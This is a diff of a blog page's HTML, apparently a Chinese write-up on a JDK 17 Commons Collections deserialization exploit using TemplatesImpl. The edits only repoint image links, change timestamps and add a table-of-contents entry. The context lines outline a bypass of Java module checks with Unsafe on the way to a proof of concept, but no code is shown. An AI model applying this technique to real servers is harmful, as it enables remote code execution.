-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756981998262-9ac7eacc-f288-4311-90ad-726ca1806c58.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756981998262-9ac7eacc-f288-4311-90ad-726ca1806c58.png"
                      
                 ></p>
 <p>openPackages !&#x3D; null 满足不了，看下面</p>
@@ -730,7 +730,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1757071826409-497d92c0-9616-4201-8f02-5cf0c8dfa98d.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1757071826409-497d92c0-9616-4201-8f02-5cf0c8dfa98d.png"
                      
                 ></p>
 <p>现在看 allows(exportedPackages.get(pn), other)</p>
@@ -738,7 +738,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756982225534-5dad48f5-0982-41dd-8a7e-5ac15b260f3c.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756982225534-5dad48f5-0982-41dd-8a7e-5ac15b260f3c.png"
                      
                 ></p>
 <p>首先我们要让 targets 不为 null，也就是 exportedPackages.get(pn) 不为 null，否则直接就返回 false 了</p>
@@ -747,13 +747,13 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756982462921-d7604383-a44a-4a8d-8942-173f1295a348.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756982462921-d7604383-a44a-4a8d-8942-173f1295a348.png"
                      
                 ></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756984852124-bd4fff3d-810f-494e-9b23-166f7bd71310.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756984852124-bd4fff3d-810f-494e-9b23-166f7bd71310.png"
                      
                 ></p>
 <p>我们让 pn 是这些键值中的任意一个就可以了，看一下 pn 是什么：</p>
@@ -761,7 +761,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756984963637-2832bdeb-97f5-41c5-9ffd-5c64b7b79d1d.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756984963637-2832bdeb-97f5-41c5-9ffd-5c64b7b79d1d.png"
                      
                 ></p>
 <p>可以看到 pn 就是目标类的包名，我们同样利用 Unsafe 修改即可</p>
@@ -769,7 +769,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1757074346346-35a4beb8-135b-4246-a481-862735fc34b4.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1757074346346-35a4beb8-135b-4246-a481-862735fc34b4.png"
                      
                 ></p>
 <p>接下来一路返回 true ，回到 verifyMemberAccess，最后也返回了 true</p>
@@ -780,7 +780,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1757073246345-f3fcdb70-0a83-4a3d-96f3-1228b42a6c44.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1757073246345-f3fcdb70-0a83-4a3d-96f3-1228b42a6c44.png"
                      
                 ></p>
 <p>继续完善我们的 Transformer 数组：</p>
@@ -809,7 +809,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756978697136-6fdc9ee8-f085-4b21-81cc-9c2158b3c464.png?x-oss-process=image/format,webp"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756978697136-6fdc9ee8-f085-4b21-81cc-9c2158b3c464.png?x-oss-process=image/format,webp"
                      
                 ></p>
 <p>因为我们没办法在反序列化的时候传一个 Module 类去 patch 我们自己的类（Evil）的 Module 让它等于 被反射的类（TrAXFilter）的 Module</p>
@@ -822,7 +822,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1757121382564-cd3a0a27-783c-41d5-9474-037f08762577.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1757121382564-cd3a0a27-783c-41d5-9474-037f08762577.png"
                      
                 ></p>
 <p>修改后的poc：</p>
@@ -880,11 +880,11 @@
         <li><strong>Title:</strong> </li>
         <li><strong>Author:</strong> exp3n5ive</li>
         <li><strong>Created at
-                :</strong> 2025-09-12 15:00:50</li>
+                :</strong> 2025-09-12 14:58:52</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-09-12 15:00:30
+                    :</strong> 2025-09-12 15:13:30
             </li>
         
         <li>
@@ -980,7 +980,7 @@
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
 		<div class="page-title"></div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Unsafe-%E7%B1%BB"><span class="nav-text">Unsafe 类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%A8%A1%E5%9D%97%E6%A3%80%E6%B5%8B%E5%8E%9F%E7%90%86"><span class="nav-text">绕过模块检测原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Jdk17-%E4%B8%8B%E4%BD%BF%E7%94%A8-TemplesImpl-%E7%9A%84%E9%99%90%E5%88%B6"><span class="nav-text">Jdk17 下使用 TemplesImpl 的限制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%A7%E6%89%BF-AbstractTranslet-%E9%97%AE%E9%A2%98"><span class="nav-text">继承 AbstractTranslet 问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%B6%E6%A8%A1%E5%9D%97%E6%A3%80%E6%B5%8B%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-text">反序列化时模块检测的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0-Transformer-%E6%95%B0%E7%BB%84"><span class="nav-text">构造 Transformer 数组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E7%BB%95%E8%BF%87-newInstance"><span class="nav-text">分析绕过 newInstance</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%80%E7%BB%88-POC"><span class="nav-text">最终 POC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E5%85%85"><span class="nav-text">补充</span></a></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Jdk17-CC-%E4%B8%8B%E5%88%A9%E7%94%A8-TemplesImpl"><span class="nav-text">Jdk17&amp;CC 下利用 TemplesImpl</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Unsafe-%E7%B1%BB"><span class="nav-text">Unsafe 类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%A8%A1%E5%9D%97%E6%A3%80%E6%B5%8B%E5%8E%9F%E7%90%86"><span class="nav-text">绕过模块检测原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Jdk17-%E4%B8%8B%E4%BD%BF%E7%94%A8-TemplesImpl-%E7%9A%84%E9%99%90%E5%88%B6"><span class="nav-text">Jdk17 下使用 TemplesImpl 的限制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%A7%E6%89%BF-AbstractTranslet-%E9%97%AE%E9%A2%98"><span class="nav-text">继承 AbstractTranslet 问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%B6%E6%A8%A1%E5%9D%97%E6%A3%80%E6%B5%8B%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-text">反序列化时模块检测的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0-Transformer-%E6%95%B0%E7%BB%84"><span class="nav-text">构造 Transformer 数组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E7%BB%95%E8%BF%87-newInstance"><span class="nav-text">分析绕过 newInstance</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%80%E7%BB%88-POC"><span class="nav-text">最终 POC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E5%85%85"><span class="nav-text">补充</span></a></li></ol>
 
 	</div>
 </div>
